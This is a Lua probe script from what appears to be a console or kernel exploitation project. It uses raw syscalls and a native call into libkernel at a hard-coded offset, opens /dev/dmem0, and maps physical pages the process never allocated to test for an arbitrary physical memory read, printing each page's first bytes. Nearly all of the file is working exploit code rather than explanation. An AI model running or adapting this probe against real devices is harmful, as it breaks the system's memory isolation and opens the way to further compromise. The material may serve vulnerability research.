-- CRASH_CLASS: HIGH
-- PROBE 806a: can /dev/dmem0 map a physical page this process never allocated?
--
-- PR #158 measured alloc -> open("/dev/dmem0") -> mmap(va,0x4000,0x33,0x11,fd,phys) -> real R/W,
-- and asserted the pager "verifies allocation ownership".  That was inference.  This probe maps
-- physical addresses outside our own allocation, one at a time, and reports the mapping result
-- and the first 16 bytes.  A mapping that succeeds over a page we do not own is an arbitrary
-- physical read.
print("=== PROBE 806a: FOREIGN PHYSICAL PAGES VIA /dev/dmem0 ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
pcall(function() return getpid() end)

local libk = nil
do
    local ok, v = pcall(function() return tostring(syscall.pipe) end)
    if ok then
        local h = v:match("libkernel[@%s]*0x([0-9A-Fa-f]+)")
        if h then libk = tonumber(h, 16) end
    end
end
print("libkernel base hint: " .. tostring(libk))

local phys_out = memory.alloc(16)
wd(phys_out, 0)
local function alloc_dm(size, align)
    if not libk then return nil end
    local ok, rv = pcall(function()
        return native.fcall_with_rax(uint64(libk + 0x17EF0), 0, uint64(0),
            uint64("0x150000000"), uint64(size), uint64(align), uint64(0), uint64(phys_out))
    end)
    if not ok then return nil end
    local phys = rd(phys_out)
    return to_num(rv), phys, rd(phys_out + 4)
end

local rv, lo, hi = alloc_dm(0x4000, 0x4000)
print(string.format("[0] alloc rv=%s phys=%s%08X", tostring(rv), hi and string.format("%X", hi) or "?", lo or 0))
local own = (hi or 0) * 4294967296 + (lo or 0)

local cpath = memory.alloc(32)
for i, c in ipairs({"/dev/dmem0"}) do end
local s = "/dev/dmem0"
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[1] open /dev/dmem0 fd=" .. fd)

local function try_map(va, phys)
    local ok, r = pcall(function()
        return sc_mmap(uint64(va), uint64(0x4000), uint64(0x33), uint64(0x11), uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then return "pcall-fail" end
    return to_num(r)
end

local VA = 0x880000000
local CANDIDATES = {
    {"own", own},
    {"own+0x4000", own + 0x4000},
    {"own-0x4000", own - 0x4000},
    {"pool base 0x100000000", 0x100000000},
    {"0x110000000", 0x110000000},
    {"0x100001000", 0x100001000},
    {"0x00100000", 0x100000},
    {"0x00001000", 0x1000},
    {"0x00000000", 0},
}
for _, c in ipairs(CANDIDATES) do
    local label, phys = c[1], c[2]
    pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end)
    local r = try_map(VA, phys)
    if r == 0 then
        local a, b, cc, d = rd(VA), rd(VA + 4), rd(VA + 8), rd(VA + 12)
        print(string.format("  %-24s mmap=0  %08X %08X %08X %08X", label,
            a or 0, b or 0, cc or 0, d or 0))
    else
        print(string.format("  %-24s mmap=%s", label, tostring(r)))
    end
end
print("")
print("[2] alive pid=" .. to_num(getpid()))
